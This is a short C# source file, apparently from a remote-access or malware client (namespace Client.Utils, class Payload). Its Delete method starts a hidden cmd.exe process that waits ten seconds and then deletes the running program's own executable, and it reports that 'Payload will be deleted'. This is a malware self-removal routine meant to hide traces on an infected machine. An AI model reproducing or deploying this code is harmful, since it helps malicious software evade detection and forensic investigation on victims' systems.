using System.Diagnostics;

namespace Client.Utils
{
    internal class Payload
    {
        internal string Delete()
        {
            int _Seconds = 0xA;

            Process.Start(new ProcessStartInfo
            {
                Arguments = $"/C choice /C Y /N /D Y /T {_Seconds} & Del \"" + SysInfo.Application + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });

            return $"Payload will be deleted after {_Seconds} seconds";
        }
    }
}